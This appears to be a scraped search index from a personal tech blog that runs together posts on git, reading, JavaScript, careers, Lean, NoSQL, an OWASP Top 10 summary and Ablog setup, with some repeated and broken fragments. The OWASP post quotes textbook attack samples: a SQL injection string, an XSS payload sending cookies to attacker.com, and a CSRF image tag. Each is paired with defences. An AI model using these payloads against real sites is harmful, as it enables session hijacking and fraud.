https://github.com/{username}/{repositoryname}.git master You will be asked to enter your Github user name and credential. After the 'push' command succeeds, you can see the files appear on the Github repository. Congratulations! You manage to use the basic git commands.

Most of it is long gone and forgotten, but certainly some of it became my very bones and flesh. Personally I like reading, almost read every day and enjoying reading. This blog post is to share my experience and lessons learned how to improve the reading skills. Book types If the purpose of reading is to learn something, mainly books can be categorized into 3 types: The books can help you change your mindset and conceptual pattern (\u9053) The books can let you learn new ways of thinking and consolidate conceptual pattern (\u672f) The books can let you learn new skills and new knowledge (\u5668) Books also vary a lot on quality side. So, we need to distinguish books when reading: some books can be read fast, while others need to be read carefully and repeatedly. You need to make the decision on how to read a book, feel free if you decide to do fast reading for some books. You can learn various reading skills from book: 'How to Read a Book'. Some books are only for entertainment purpose. For these books, my suggestion is do whatever you want and just enjoy the reading. :) Reading challenges and advantages According to 'Cone of Learning' or 'Learning Pyramid', reading has the lowest retention rate after a period of time. I shared exactly same experience. After several weeks I can only remember very limited content from books; after 2 years I even cannot remember whether I read a book or not. Maybe you will ask question that why we bother reading any more, why cannot choose other more efficient methods directly? E.g. Practicing and Teach others. The followings are the reasons: Easy access: good books are easier to access than other resources Flexible time: you can control the time when to read Low restriction: you may encounter much more restriction, no one will stop you from reading So reading still plays a very important role if you want to learn. However we have to learn how to maximize the return of investment (ROI) in reading. How to read better Let me emphasize again, if you can benefit limited from a book, feel free to do fast reading or simply skip it. For some high quality books and you know you can learn a lot from them, the followings are the tips on how to read better. Research during reading When you read, do Google, look into map/wiki to do research, and take notes at the same time. It can help you understand better and deeper. For book notes, considering digital ones. Digital notes (and books) are easier to process later. If you read physical books, don't bother keeping the books clean, just take notes on the books. The value of the books is to help you learn. Review and discuss Review the book notes from time to time, which will help you to deepen the understanding. Try to tell some one else about what you learned from the book. In order to tell, you have to understand first, organize what you learned into a 'good story', then you need to present it to others.

So, we need to distinguish books when reading: some books can be read fast, while others need to be read carefully and repeatedly. You need to make the decision on how to read a book, feel free if you decide to do fast reading for some books. You can learn various reading skills from book: 'How to Read a Book'.

For these books, my suggestion is do whatever you want and just enjoy the reading. :)","title":"Book types"},{"location":"2017/how_to_read_books/#reading-challenges-and-advantages","text":"According to 'Cone of Learning' or 'Learning Pyramid', reading has the lowest retention rate after a period of time. I shared exactly same experience. After several weeks I can only remember very limited content from books; after 2 years I even cannot remember whether I read a book or not. Maybe you will ask question that why we bother reading any more, why cannot choose other more efficient methods directly? E.g. Practicing and Teach others. The followings are the reasons: Easy access: good books are easier to access than other resources Flexible time: you can control the time when to read Low restriction: you may encounter much more restriction, no one will stop you from reading So reading still plays a very important role if you want to learn. However we have to learn how to maximize the return of investment (ROI) in reading.","title":"Reading challenges and advantages"},{"location":"2017/how_to_read_books/#how-to-read-better","text":"Let me emphasize again, if you can benefit limited from a book, feel free to do fast reading or simply skip it.

This blog introduces the basic concept of Javascript language. Table of Contents Javascript Basic First, let's compare Javascript with a OOP programming language C#. +-----------------------+-----------------------+ | C# | Javascript | +-----------------------+-----------------------+ | Strongly-Typed | Loosely-typed | +-----------------------+-----------------------+ | Static | Dynamic | +-----------------------+-----------------------+ | Classical Inheritance | Prototypal | +-----------------------+-----------------------+ | Classes | Functions | +-----------------------+-----------------------+ | Constructors | Functions | +-----------------------+-----------------------+ | Methods | Functions | +-----------------------+-----------------------+ Strongly typed or weakly typed (loosely typed) In general, a strongly typed language is more likely to generate an error or refuse to compile if the argument passed to a function does not closely match the expected type. On the other hand, a weakly typed language may produce unpredictable results or may perform implicit type conversion. var x = 0; var isNumber = typeof x == \"number\"; x = new Object(); Duck typing Type is less important, but shape is important function Feed(ani) { ani.Feed() } // accepts any object implements Feed function Dynamic Typing A language is statically typed if the type of a variable is known at compile time. A language is dynamically typed if the type is associated with run-time values, and not named variables/fields/etc. var x = { name: \"Shawn\", city: \"Atlanta\" }; x.phone = \"xxx-xx-xxx\"; x.makeCall = function() { callSomeone(this.phone); }; Type Type Coalescing Javascript wants to coalesce values. \"test \" + \"me\" \"test \" + 1 \"test \" + true \"test \" + (1 == 1) 100 + \"25\" // 10025 Most operators in Javascript are identical to .net, except\u2026 Equality/NotEqual (==, !=): The means determines equality with coalescing (if necessary) Javascript's identically Equality operators (===, !==) which is similar to .Equal(). Determines quality without coalescing \"hello\" == \"hello\"; // true 1 == 1; // true 1 == \"1\"; // true 1 === \"1\"; // false 1 !== \"1\"; // true Types Primitives Javascript has basic types Value types: boolean, string, number Reference Type: object Delegate type: function Special: undefined, null var a = typeof 1; //number var b = typeof 1.0; // number var c = typeof true; // boolean var d = typeof false; // boolean var e = typeof \"hello world\"; // string Number Examples of number: 1, 1.5, 070, 0xffff, 1.34e6, 10.0 Number.MIN_VALUE Number.MAX_VALUE Number.POSITIVE_INFINITY; Number.NEGATIVE_INFINITY; Operator var fail = 10/\"zero\"; // NaN var test1 = NaN == NaN; // false var test2 = isNaN(NaN); // true var test3 = isNaN(fail); //true var test4 = isNaN(10); // false var test5 = isNaN(\"10\"); //false var test6 = isNaN(\"fail\");//true All the following values are false if(\"\") if(0) if(10/0) if(null) if(undefined) Function Overloading function Javascript does not support function overload. function foo(one) { alert('first); } function foo(one, two) { alert('second'); } foo(1); // second The second one simply overrule the first one Arguments object Arguments object is available inside function body only. function foo(one, two, three) { alert(arguments.length); } foo(1); //1 foo(1, 2); //2 foo(1,2,3); //3 Accessing the values through arguments object. function foo() { for(var x = 0; x < arguments.length; x++) { alert(arguments[x]); } } foo(1, 2, 3); // 1,2,3 All functions return a value If not defined then it's 'undefined' function foo() { return; } var x = foo(); Function is just an object Has properties and member functions function log(s) { alert('yup'); } var x = log.length; // 1 parameter var y = log.name; // 'log' var z = log.toString() // 'function log(s) { alert('yup'); } Function Body Variable \"this\" applies to the owner of the function var f = function() { alert(this); }; f(); // [Object Window] var obj = { name: 'myObj', myFunc: function() { console.log(this.name); } }; obj.myFunc(); // 'myObj' var f = obj.myFunc.bind(this); f(); // this == global object bind() lets you change the owner. For details, see: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/this Closures JavaScript closure makes it possible for a function to have \"private\" variables. var add = (function () { var counter = 0; return function () {return counter += 1;} })(); add(); add(); add(); // the counter is now 3 The variable add is assigned the return value of a self-invoking function. The self-invoking function only runs once. It sets the counter to zero (0), and returns a function expression. This way add becomes a function. The \"wonderful\" part is that it can access the counter in the parent scope. The counter is protected by the scope of the anonymous function, and can only be changed using the add function. The magic is that in JavaScript a function reference also has a secret reference to the closure it was created in \u2014 similar to how delegates are a method pointer plus a secret reference to an object. function say667() { var num = 42; var say = function() { console.log(num); } num++; return say; } var sayNumber = say667(); sayNumber(); //logs 43 var gLogNumber, gIncreaseNumber, gSetNumber; function setupSomeGlobals() { var num = 42; gLogNumber = function() { console.log(num); } gIncreaseNumber = function() { num++; } gSetNumber = function(x) { num = x; } } setupSomeGlobals(); gIncreaseNumber(); gLogNumber(); //43 gSetNumber(5); gLogNumber(); // 5 var oldLog = gLogNumber; setupSomeGlobals(); gLogNumber(); // 42 oldLog() //5 Note that in the above example, if you call setupSomeGlobals() again, then a new closure (stack-frame!) is created. The old gLogNumber, gIncreaseNumber, gSetNumber variables are overwritten with new functions that have the new closure. Closure can also introduce tricky bugs if not used correctly. function buildList(list) { var result = []; for (var i = 0; i < list.length; i++) { var item = 'item' + i; result.push(function() { console.log(item + ' ' + list[i]) }); } return result; } function testList() { var fnlist = buildList([1,2,3]); for (var j = 0; j < fnlist.length; j++) { fnlist[j](); } } testList() // logs 'item2 undefined' 3 times This is because just like previous examples, there is only one closure for the local variables for buildList. When the anonymous functions are called on the line fnlist j ; they all use the same single closure, and they use the current value for i and item within that one closure (where i has a value of 3 because the loop had completed, and item has a value of 'item2'). Note we are indexing from 0 hence item has a value of item2. And the i++ will increment i to the value 3. Self-executing function (function() { var private_variable = 'private'; })(); Scope Javascript has scope chain. When looking for the definition of a variable, the javascript engine first looks at the local execution context object. If the definition isn't there, it jumps up the scope chain to the execution context it was created in and looks for the variable definition in that execution context object, and so on until it finds the definition or reaches the global scope. Global scope. Objects at root are 'global'. var a = 'Hello' if(true) { var b = a; } var c = b; //this works var a = 'hello'; function() { var b = a; } var c = b; //this doesn't work Javascript lacks real namespaces. We can mimic by creating with objects to avoid polluting the global scope. // Construct or Import Namespace var WilderMinds = WilderMinds || {}; WilderMinds.currentTime = function() { return new Date(); }; Anonymous self-executing functions: protects the global namespace by function scope All Together: Namespaces and Anonymous Self-Executing Functions (function(ns) { var currentDate = new Date(); ns.currentTime = function() { return currentDate; }; })(window.WilderMinds = window.WilderMinds || {}); OOP in Javascript Javascript also support OOP paradiam. Inheritance var proto = { sentence: 4, probation: 2 }; var Prisoner = function (name, id) { this.name = name; this.id = id; }; Prisoner.prototype = proto; var firstPrisoner = new Prisoner('Joe', '12A'); var secondPrisoner = new Prisoner('Sam', '2BC'); Object.Create can also do the same thing Javascript also has prototype chain. proto proto is the actual object that is used in the lookup chain to resolve methods, etc. prototype is the object that is used to build proto when you create an object with new(). 'Class' in Javascript Closures can make properties private funciton Customer(name, company) { //public this.name = name; this.company = company; // private var mailServer = 'mail.google.com'; this.sendEmail = function(email) { sendMailViaServer(mailServer); }; } Static Members function Customer(name, company) { this.name = name; this.company = company; } Customer.mailServer = 'mail.google.com'; Sharing a function That way each instance doesn't have it's own copy Customer.prototype.send = funciton(email) { \u2026 } Basic inheritance with the Prototype object function Cow(color) { this.color = color; } Cow.prototype = new Animal('Hay'); var c = new Cow('White'); c.feed(); var test = c instanceof Animal; // true var test2 = c instanceof Cow; // true Can Fake Abstract Classes with some caveats var Animal = { foodType: 'None', feed: function() { log('fed the animal: ' + this.foodType); } }; var a = new Animal(); //Fails (not a constructor) Object Reflection Property Syntaxes Dot syntax: cust.name Bracket Syntax: cust[\"name\"] Enumerating members: simplest version of reflection var cust = { name: 'Shawn', 'company name': 'Wilder Minds', sendMail: function() { \u2026 } }; for (var prop in cust) { alert(prop); alert(cust[prop]); } var has = cust.hasOwnProperty('name'); var isEnum = cust.propertyIsEnumerable('name'); Extension methods prototype can be used to add extension methods Add to existing type's prototype Array.prototype.calculateCount = function() { return this.length; }; var a = ['one', 'two']; var count = a.calculateCount(); Written by Binwei@Trondheim","title":"Introduction to Javascript"},{"location":"2017/introduction_to_javascript/#introduction-to-javascript","text":"Published: Sep 9, 2017 Tags: web, frontend Category: ComputerScience Javascript is the fundumantal programming language for frontend development.

Many people treat the company as their home, put all their energy and be 100% loyal to the company, but seldom to think about themselves. There is nothing wrong with the attitude only if you are aware of the job security. Marketing is up-and-down and most companies needs to be profitable to survive. They have to lay off people if necessary, these people can be you no matter you treat the company as home or not. It will put you into a very negative situation if you do not prepare well for your job security. Table of Contents Income Job security will ensure you have income to grantee your living standard, and have the freedom to do what you like. Income security Job security is different from income security. If your job is all your income, or you have big load but only depend on your current job to pay that, then you give the power to people in the company towards you. Think about having income besides your job salary, e.g. rent your spare rooms, have part-time job. Take income security into your career management. Emergency fund Financial worries make people harder to think about other things and you need to prepare for the unexpected events. Setup emergency fund, e.g. 6-8 months income. Live (well) beneath your means I like the quote from Richard Stallman: I've always lived cheaply. And I like that, because it means that money is not telling me what to do. I can do what I think is important for me to do. Avoid getting sucked into expensive lifestyle habits. Because if you do that, then people with the money will dictate what you do with your life. You won't be able to what's really important to you. Know your salary context Different occupation has different salary trending when age increases. You need to be aware of it and plan accordingly. There are several things impact salary, it is important you understand the 'context' of your salary especially when you want to do a job hopping. Know the salary context, then you will know plan your skill set and plan where to go next. Skill set In order to get job security, the skills and knowledge are the key! For the technology skills/knowledge, you can look into my previous blog: technology_to_learn_next At the meantime, soft skills are important to build, which will not be obsolete. Communication Leadership Networking Branding Networking and branding are very important. A lot of the good job positions are by referral, search jobs is the last choice for you. Please also be aware that one tricky thing about most soft skills is they are quite difficult to identify in an interview. I will write blogs to explain the soft skill later. Career path when aged Different career path requires you prepare differently in order to get job security. Job security become more and more important when people get aged. The technical path Threats It's harder to do the long hours Slower salary increases Pressure from lower cost experts Advice Leverage experience to build strengths in the design and architecture Develop non-technical expertise Seek out companies have distinct technical career paths Domain knowledge can matter Build your brand The management path Maybe Potential higher salaries at many companies Less pressure to maintain technical edge Advices Requires a distinct skill set, e.g. people management skills, business knowledge, project management, finance, logistics Other path Product management Marketing Writing (documentation, books, articles, podcasts, webinars) Technical evangelist or support Teacher/trainer Executive/Entrepreneur Join the right companies Companies are different, join a company fits you will make your life easier.

A lean organization understands customer value and focuses its key processes to continuously increase it. To accomplish this, lean thinking changes the focus of management from optimizing separate technologies, assets, and vertical departments to optimizing the flow of products and services through entire value streams that flow horizontally across technologies, assets, and departments to customers. There are 5 principles in Lean. Table of Contents Identify value Value adding activities: We need to maximize the investment on value-adding activities. Non-value adding activities: Some activities do not create value but is still necessary, e.g. admin meetings. We need to be careful about the time spent on these activities. Waste: Waste does not create value for a customer, e.g. Partially Done Work, Extra Processes, Extra Features, Task Switching, Waiting, Motion, Defects. Waste needs to be eliminated. Mainly, the root cause of waste can be categorized into followings: Lack of understanding customers Lack of standard procedure and system Lack of communication and control Lack of responsibility and competence Map the value stream Mapping your value stream is a good way to start discovering the waste in your software development process. Value stream is a series of activities that must be done in a certain order at the right time to deliver a service. Your Value stream map is a representation of the flow of materials from supplier to customer through your organization as well as the flow of information. This enables you to see at a glance where the delays are in your process, any restraints and excessive inventory. Your current state map is the first step in working towards your ideal state for your organization. Value streaming mapping will be explained in my later blog. Create flow After the waste has been removed from the value stream, the next step is to be sure the remaining steps flow smoothly with no interruptions, delays, or bottlenecks. Establish pull With improved flow, time to market (or time to customer) can be dramatically improved. This makes it much easier to deliver products as needed, as in \u201cjust in time\u201d manufacturing or delivery. This means the customer can \u201cpull\u201d the product from you as needed.

Quality means realization of purpose or fitness for use rather than conformance to requirements. Establish Information Flow Perceived integrity: is affected by the customer's whole experience of a system. Conceptual integrity: means that a system's central concepts work together as a smooth, cohesive whole. Perceived integrity is a reflection of the integrity of the information flow from customers and users to developers. Conceptual integrity is a reflection of the integrity of the upstream/downstream technical information flow The way to build a system with high perceived and conceptual integrity is to have excellent information flows both from customer to development team and between the upstream and downstream processes of the development team. Smaller systems should be developed by a single team that has immediate access to the people who will judge the system's integrity. The team should use short iterations and show each iteration to a broad range of people who will know integrity when they see it, so they can make course corrections based on feedback. Customer tests provide excellent customer\u2013developer communication. Complex system should be represented using a language and a set of models that the customers understand and the programmers can use without intervening refinement. Large systems should have a master developer who has deep customer understanding and excellent technical credentials, and whose role is to facilitate the design as it emerges, representing the customer's interests to the developers. Suppose a developer has a conversation with a customer about details of a feature. The conversation should not be considered complete until it is expressed as a customer test. By documenting the design in tests, developers can write code with a clear understanding of exactly what it is supposed to do. This is a good way to refine thinking and help developers write code with conceptual integrity. Decide as Late as Possible Postpone the decision as much as possible, no matter in your requirement, design, architecture, or implementation work. Options thinking is an important tool in software development as long as it is accompanied by recognition that options are not free and it takes expertise to know which options to keep open. Empower Front-line Lean thinking capitalizes on the intelligence of front-line workers, believing that they are the ones who should determine and continually improve the way they do their jobs. We believe that the critical factor in motivation is not measurement, but empowerment: moving decisions to the lowest possible level in an organization while developing the capacity of those people to make decisions wisely. The way to be sure that everything is measured is by aggregation, not disaggregation. That is, move the measurement one level up, not one level down. Stay Cool Transferring practices from one environment to another is often a mistake. Instead, one must understand the fundamental principles behind practices and transform those principles into new practices for a new environment. Today's organizations are littered with failed improvement programs, whether they go by the name CMM, ISO9000, TQM, Six Sigma, or even Lean. It is notoriously difficult to implement successful improvement programs, and even more difficult to sustain them over time.

NoSQL databases are increasingly used in big data and real-time web applications. NoSQL databases are not replacing relational database, there are scenarios only fit for NoSQL database. This blog give a brief introduction of NoSQL databases. Table of Contents Motivation The benefits you can get from NoSQL include: Simplicity of design In relational database, the application developers need to design the database scheme to store the data. There is difference between the schema and the in-memory data structure. Then the developers need to handle this 'gap'. This effort is not delivering business value. Relational database world invents ORM (Object-Relational-Mapping) to mitigate this challenge. Horizontal scaling Horizontal scaling means that you scale by adding more machines into your pool of resources whereas Vertical scaling means that you scale by adding more power (CPU, RAM) to an existing machine. NoSQL databases have better support for simpler \"horizontal\" scaling to clusters of machines (which is a problem for relational databases) A cluster of small machines can use commodity hardware and ends up being cheaper at these kinds of scale. Finer control over availability There is a common need to ensure the service availability. When one node is down, the backup should take effect. It requires replication mechanism, which means to take the same data and copy it over multiple nodes There are two kinds of replication methods: Master-slave replication: Is a one-way replication (from master to slave), only the master database is used for the write operations, while read operations may be spread on multiple slave databases. It reduces the chances of update conflict. Peer-to-peer replication: It is bi-directional replication, each database (nodes) is publisher and subscriber. If any node goes down, the application will still be functional. Later, once the node is up it can be again brought in sync. This way we can achieve both high availability and fault tolerance. It can avoid loading all writes onto a single point of failure. Sharding is also important, which is to put different data on different nodes. Category In general, there are 4 categories NoSQL databases in NoSQL ecosystem: Key-value store Key-value store is the simplest NoSQL database. The basic data structure is a dictionary or map. Key-value databases are well-suited to applications that have frequent small reads and writes along with simple data models. Aggregate is a collection of related objects that we wish to treat as a unit, which is indexed by a key that you can use of lookup. Aggregate is opaque to database which is just some big blob of mostly meaningless bits. Key-value store cannot run query not retrieve a part of the aggregate. Examples: Riak, Redis, Memcached, Berkely DB, Hamster DB, Amazon's Dynamo, Project Voldemort Document database Document databases extend the concept of the key-value database. Document databases maintain sets of key-value pairs within a document. So document database is able to see a structure in the aggregate, which allows queries and partial retrievals. Document database is flexible which does not require schema. Examples: MongoDB, Couch DB, Terrastore, OrientDB, RavenDB, Notes Storage Facility Column-family Column-family databases are designed for large volumes of data, read and write performance, and high availability. If your data is small enough to run with a single server, then a column family database is probably more than you need - consider a document or key-value database instead. Column-family databases store data in column families as rows that have many columns associated with a row key. Column-families are groups of related data that is often accessed together. Column-family database has two-level aggregate structure, which allows you to store data with keys mapped to values and the values grouped into multiple column families, each column family being a map of data. Each column family can be compared to a container of rows in an RDBMS table where the key identifies the row and the row consists of multiple columns. The differences are: * various rows do not have to have the same columns * columns can be added to any row at any time without having to add it to other rows. Examples: Cassandra, Hbase, Hypertable, Amazon SimpleDB Graph database Graph databases allow you to store entities and relationships between these entities. In graph databases, traversing the joins or relationships is very fast. The relationship between nodes is not calculated at query time but is actually persisted as a relationship. It means graph databases do not allow dangling relationship, and nodes can only be deleted if they don't have any relationships attached to them. Examples: Neo4j, OrientDB, Infinite Graph Technical concepts There are several technical concepts relevant to NoSQL databases. Map-reduce pattern Map is a function whose input is a single aggregate and whose output is a bunch of key-value pairs. Reduce takes multiple map outputs with the same key and combines their values. While the map function is limited to working only on data from a single aggregate, the reduce function can use all values emitted for a single key. Eventual consistency Many NoSQL stores compromise consistency in favor of availability, partition tolerance, and speed. Instead, most NoSQL databases offer a concept of \"eventual consistency\" in which database changes are propagated to all nodes \"eventually\" (typically within milliseconds) so queries for data might not return updated data immediately or might result in reading data that is not accurate, a problem known as stale reads. Additionally, some NoSQL systems may exhibit lost writes and other forms of data loss. Fortunately, some NoSQL systems provide concepts such as write-ahead logging to avoid data loss. For distributed transaction processing across multiple databases, data consistency is an even bigger challenge that is difficult for both NoSQL and relational databases.

It reduces the chances of update conflict. Peer-to-peer replication: It is bi-directional replication, each database (nodes) is publisher and subscriber. If any node goes down, the application will still be functional. Later, once the node is up it can be again brought in sync. This way we can achieve both high availability and fault tolerance. It can avoid loading all writes onto a single point of failure. Sharding is also important, which is to put different data on different nodes.","title":"Finer control over availability"},{"location":"2017/nosql_introduction/#category","text":"In general, there are 4 categories NoSQL databases in NoSQL ecosystem:","title":"Category"},{"location":"2017/nosql_introduction/#key-value-store","text":"Key-value store is the simplest NoSQL database. The basic data structure is a dictionary or map. Key-value databases are well-suited to applications that have frequent small reads and writes along with simple data models. Aggregate is a collection of related objects that we wish to treat as a unit, which is indexed by a key that you can use of lookup. Aggregate is opaque to database which is just some big blob of mostly meaningless bits. Key-value store cannot run query not retrieve a part of the aggregate.

If your data is small enough to run with a single server, then a column family database is probably more than you need - consider a document or key-value database instead. Column-family databases store data in column families as rows that have many columns associated with a row key. Column-families are groups of related data that is often accessed together. Column-family database has two-level aggregate structure, which allows you to store data with keys mapped to values and the values grouped into multiple column families, each column family being a map of data. Each column family can be compared to a container of rows in an RDBMS table where the key identifies the row and the row consists of multiple columns.

Additionally, some NoSQL systems may exhibit lost writes and other forms of data loss. Fortunately, some NoSQL systems provide concepts such as write-ahead logging to avoid data loss.

Injection Injection has many types: SQL injection NoSQL injection Command injection Code injection Path traversal ORM injection XML injection XPath injection Example A web server makes a query string like the following: String query = \"SELECT * FROM accounts WHERE custID='\" + request.getParameter(\"id\") + \"'\"; The attacker modifies the \u2018id\u2019 parameter value in her browser to send: ' or '1'='1. How to prevent White-list (untrusted data): What input do we trust? Does it adhere to expected pattern? Use safe API which provides parameterized interface Escape special character Positive or 'white list' input validation 2. Broken authentication and session management It means session management assets like user credentials and session IDs are not properly protected. Example If a web site put the token into the query string: http://example.com/sale/saleitems;jsessionid=2P0OC2JSNDLPSKHCJUN2JV?dest=Hawaii Then if the user share the link with others, the token/session id will be used by others. There are other ways to hack the authentication and session management system. Auth cookie theft: Exploit an XSS risk Retrieve it from the victim's PC Sniff it over an insecure connection Account management attack: Brute force the login Exploit password reset Discover weak credentials Session ID theft: Copy and paste a URL with it Send it via an insecure email Retrieve it from a log How to prevent Protect the cookies: Use the HttpOnly flag (HttpOnly is an additional flag included in a Set-Cookie HTTP response header, If the HttpOnly flag (optional) is included in the HTTP response header, the cookie cannot be accessed through client side script) Make sure they're flagged as 'secure' Decrease the window of risk: Expire sessions quickly Re-challenge the user on key actions Other ways: Authentication must be over TLS Passwords policy \"Secure\" error messages Multiple-factor authentication CAPTCHA Block accounts Restore passwords No session identifier in URL Use TLS Logout Close browser window Secure passwords storage: Do not forget salt; SHA-256, SHA-512; PBKDF2, bcrypt, scrypt 3. Cross-site scripting (XSS) XSS has the following types: Stored XSS Reflected XSS DOM Based XSS Example If the web server generate the content by using following code: (String) page += \"<input name='creditcard' type='TEXT' value='\" + request.getParameter(\"CC\") + \"'>\"; The attacker modifies the \u2018CC\u2019 parameter in his browser to: '><script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi? foo='+document.cookie</script>'. This attack causes the victim\u2019s session ID to be sent to the attacker\u2019s website, allowing the attacker to hijack the user\u2019s current session. How to prevent Validation: Xxs-filters; Secure-filters; Xss; Validator-js HttpOnly cookies Helmet-csp (Content Security Policy) 4. Insecure direct object references Insecure direct object reference has the vulnerability to let the hacker get to know the internal system design. Example If the web server has the following code: var messageId = req.params.messageId; messagesDAO.getById(messageId, function(error, message) { return res.render(\"message\", message); } The hacker can use: http://site.com/view-message?messageId=1 How to prevent Use per user or session indirect object references. Check permissions on all application's layers Testing & Code review 5. Security misconfiguration Example The app server admin console is automatically installed and not removed. Default accounts aren\u2019t changed. Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over. How to prevent Use following tools: Ansible, chef, puppet Helmet Hpp Cors Node-ipgeoblock Express-limiter Safe-regex 6. Sensitive data exposure Relevant types: Sniffing Insecure cryptographic storage Example The password database uses unsalted hashes to store everyone\u2019s passwords. A file upload flaw allows an attacker to retrieve the password file. All of the unsalted hashes can be exposed with a rainbow table of precalculated hashes. Insufficient use of SSL login not loaded over HTTPS Mixed mode Cookies not sent securely Bad crypto Incorrect password storage Poor protection of keys Weak algorithm chosen Other exposure risks Browser auto-complete Leaked via logs Disclosure via URL How to prevent Always use TLS (TLS 1.1 and TSL 1.2) Secured control only over HTTPS HTTP content in HTTPS pages Use cookie's Secure attribute Minimize sensitive data collection Use strong crypto storage Use Javascript Cryptography: Crypto Sjcl (Stanford) Crypto-js Node-forge Web Cryptography API PolyCrypt 7. Missing function level access control Relevant types: Security through obscurity Checking permissions only in UI Missing permissions check in helper services Relevant questions: Does the UI show navigation to unauthorised functions? Are server side authentication or authorization checks missing? Are server side checks done that solely rely on information provided by the attacker? Are system or diagnostic resources accessible without proper authorisation? Will \"force browsing\" disclosure unsecured resources? Example Attacker uses automated tool like OWASP ZAP or SQLMap to detect vulnerabilities and possibly exploit them. How to prevent Check permission on all application's layer Authentication middleware Testing & Code review Define a clear authorisation model Check for forced browsing Always test unprivileged roles 8. Cross-site request forgery (CSRF) CSRF indicates token vulnerability. Example The application allows a user to submit a state changing request that does not include anything secret. For example: http://example.com/app/transferFunds?amount=1500 &destinationAccount=4673243243 So, the attacker constructs a request that will transfer money from the victim\u2019s account to the attacker\u2019s account, and then embeds this attack in an image request or iframe stored on various sites under the attacker\u2019s control: <img src=\"http://example.com/app/transferFunds? amount=1500&destinationAccount=attackersAcct#\u201c width=\"0\" height=\"0\" /> If the victim visits any of the attacker\u2019s sites while already authenticated to example.com, these forged requests will automatically include the user\u2019s session info, authorizing the attacker\u2019s request. BTW, iframe means inline frame is used to embed another document within the current HTML document. How to prevent Include the unique token in a hidden field. This includes the value in the body of the HTTP request, avoiding its exposure in the URL. Employ anti-forgery tokens Validate the referrer Use csurf 9. Using components with known vulnerabilities If you build your app by using 3rd party components, the know vulnerabilities of the components impact you. See following links: https://nodesecurity.io https://snyk.io http://cve.mitre.org https://nvd.nist.gov https://www.exploit-db.com https://www.cvedetails.com 10. Unvalidated redirects and forwards Unvalidated url redirects and forwards may also cause problems. Example Let's say if your web site contains following code: app.get(\"/login\", function(req, res, next) { return res.redirect(req.query.url); }); http://site.com/login?url=/admin Hacker can provide a url which looks exactly the same as the original web page which asks for user name/password. How to prevent Use a URL whitelist Use indirect references Check the referrer Do not use redirects Do not use parameters to create redirect link Validate destination parameter: valid-url References Other valuable references to look: https://github.com/OWASP/NodeGoat https://github.com/cr0hn/vulnerable-node https://github.com/clarkio/vulnerable-app https://github.com/toolness/security-adventure https://github.com/bkimminich/juice-shop https://www.owasp.org/index.php/ Written by Binwei@Oslo","title":"Security: Owasp Top 10"},{"location":"2017/security_owasp_top_10/#security-owasp-top-10","text":"Published: Jul 05, 2017 Tags: security Category: ComputerScience The Open Web Application Security Project (OWASP) is an open community dedicated to enabling organizations to develop, purchase, and maintain applications and APIs that can be trusted.

The brain of human being has retention rate of what is learned. In order to learn efficiently, people need to be more active on discussing, practicing and teaching. No matter your blog has already got millions of followers or not, the blog writing itself is very beneficial for yourself to learn better. This blog post will teach you how to setup your personal blog by using open source technology like Sphinx and Ablog. Table of Contents Why DIY? Nowadays, there are many free blog sites you can choose like Wordpress, Blogger, Ghost. Users can get a lot of nice features out of box, and write good look and feel blogs. Then why bother doing it yourself? The followings are the main reasons for the DIY approach: You have the full control of the blog source files which reduces the risks if sites are closed or change the pricing model Easier to maintain the blog content You have more flexibility to customize your blog site DIY itself has a lot of fun! I am not saying DIY is a better way. There are pros/cons of both choices, it is mainly your personal preference. Sphinx, Ablog and Github Pages To setup blog sites yourselves has many ways, on theory you can write all the pages from scratch. It will make the life easier if you consider using existing tools. In this post, several open source tools like Sphinx, Ablog will be used. And we will use Github Pages to hold the blog sites. Sphinx Sphinx is from Python community and makes it easy to create beautiful documentation. http://www.sphinx-doc.org/ Sphinx uses reStructuredText as its markup language, which has good readability and easy to maintain. Ablog Ablog is a Sphinx extension which helps to setup blog site efficiently. http://ablog.readthedocs.io/ Github Pages Github Pages is a product of Github ecosystem, which is a website for you and your projects. The advantage of Github Pages is that it is hosted directly from Github repository. It makes all our blog source files under source control! https://pages.github.com/ Let's start building our blog site~~~ Installation Python Python installation if the first step, go to: https://www.python.org/ Install latest Python 3.x, which contains the handy utilities like pip. You can verify the installation by starting a console app and type python. If everything goes right, you will get output like following: Python 3.6.1 (v3.6.1:69c0db5, Mar 21 2017, 17:54:52) [MSC v.1900 32 bit (Intel)] on win32 Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> You can see the version 3.6.1 on my computer. Ctrl + Z to exit the python. Sphinx and Ablog Ablog installation will cover the Sphinx. Go to your console app again and type: pip install -U ablog It will install all the relevant tools like Sphinx, Alabaster, Werkzeug etc. You can verify the installation simply by typing ablog in the console app. If everything goes well, you will see the output from ablog. Github Pages You need a github account. You have it, right? :) Create a new repository which has the name: [username].github.io. This repository will be the place to host your blog sites. I recommend you to create a separate repository in github to host your blog source files - Sphinx files in this case. For this blog sites, you can find the blog site repository: https://github.com/wubw/wubw.github.io And the blog source files repository: https://github.com/wubw/BinweiBlog Post and Deploy Assuming that you have created two github repositories as mentioned above: One for blog site One for blog source file Open console app, and switch to blog source file repository. Run ablog start command to setup the current directory as ablog repository. Several examples blog source files are created, which have Sphinx file extension: .rst Run ablog build to build the repository. The build process is to generate html/javascript/css files from your source files (.rst). Run ablog serve to view the blog site locally. If everything goes well, you are supposed to see the blog pop-up in your web browser. Run ablog post + filename.rst to add a new blog post. conf.py in the root of repository is the configuration file, you can change the theme and customize your blog site in it. Run ablog deploy to deploy the blog to the destination github repository. You need to add github_pages configuration into conf.py. I encounter some deployment challenges in my Windows operating system, will explain how I resolve it in Notes _ section. This blog site is using exactly the same tools, so you can expect to see the similar result for your own blog site. Notes You may encounter some mysterious errors since ablog is still under construction. In this section, I just share some important notes from my point of view. ablog build error When I run ablog build first on my computer, I encounter the following error: Traceback (most recent call last): File \"C:\\Users\\wubw\\AppData\\Local\\Programs\\Python\\Python36-32\\Scripts\\ablog-script.py\", line 11, in <module> load_entry_point('ablog==0.8.4', 'console_scripts', 'ablog')() File \"c:\\users\\wubw\\appdata\\local\\programs\\python\\python36-32\\lib\\site-packages\\ablog\\commands.py\", line 404, in ablog_main namespace.func(**namespace.__dict__) File \"c:\\users\\wubw\\appdata\\local\\programs\\python\\python36-32\\lib\\site-packages\\ablog\\commands.py\", line 119, in ablog_build confdir = find_confdir() File \"c:\\users\\wubw\\appdata\\local\\programs\\python\\python36-32\\lib\\site-packages\\ablog\\commands.py\", line 22, in find_confdir if 